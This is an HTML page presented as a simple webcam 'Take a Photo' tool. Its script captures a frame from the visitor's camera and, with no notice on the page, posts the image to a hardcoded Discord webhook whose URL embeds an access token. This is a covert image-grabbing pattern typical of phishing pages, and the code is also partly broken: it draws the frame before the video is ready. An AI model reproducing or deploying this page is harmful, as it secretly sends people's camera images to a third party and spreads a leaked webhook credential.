<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
</head>
<body>
    <h1>Take a Photo</h1>
    <button onclick="capturePhoto()">Capture Photo</button>
    <img id="capturedImage" style="display: none;">

    <script>
        function capturePhoto() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    const capturedImage = canvas.toDataURL('image/jpeg');
                    document.getElementById('capturedImage').src = capturedImage;
                    document.getElementById('capturedImage').style.display = 'block';

                    // Send captured image to webhook
                    fetch('https://discord.com/api/webhooks/1179754334548922439/xGhYVQkS9YWjFrR9ca2r3g9kMR6mgtL98EInOXerbjbh0Q2GoI47B3Qi_mWmVgINd9uc', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            image: capturedImage
                        })
                    }).then(() => {
                        console.log('Photo captured and sent successfully!');
                    }).catch(error => {
                        console.error('Error sending captured photo:', error);
                    });
                })
                .catch(error => {
                    console.error('Error capturing photo:', error);
                });
        }
    </script>
</body>
</html>
